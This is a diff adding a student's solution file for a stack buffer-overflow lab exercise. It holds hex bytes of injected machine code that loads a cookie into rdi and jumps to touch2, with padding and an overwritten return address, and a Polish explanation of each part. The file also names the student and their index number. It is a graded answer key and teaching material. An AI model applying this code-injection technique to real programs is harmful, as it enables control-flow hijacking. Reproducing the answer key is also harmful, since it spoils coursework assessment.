@@ -1,0 +1,24 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Krzysztof Chmiel, 316749
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+48 c7 c7 8c 14 fd 24 68
+ec 1b 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+58 05 66 55 00 00 00 00
+ec 1b 40 00 00 00 00 00
+
+/*
+ * Pierwsza linijka poza ostatnim bajtem przenosi ciastko do rdi. Bajty które tam są (poza 68) pochodzą z kodu, który 
+ * napisałem w assembly, następnie skompilowałem do pliku *.o i zdeasemblowałem objdumpem. Od bajtu 68 do c3 jest z tego samego pliku
+ * relokowalnego i odnosi sie do instrukcji push, która pushuje na stos $0x"adres_procedury_touch2". Potrzebne jest do, żeby nie było
+ * seg faulta. c3 typowo odpowiada za reta. Potem mamy zera zapychające bufor aż do przedostatniej linijki. Tam znajduje się adres 
+ * zwrotny rsp, z kolei w ostatniej linijce jest adress pocczatku procedury touch2. Potem tak jak w pierwszym ./hex...
+ */
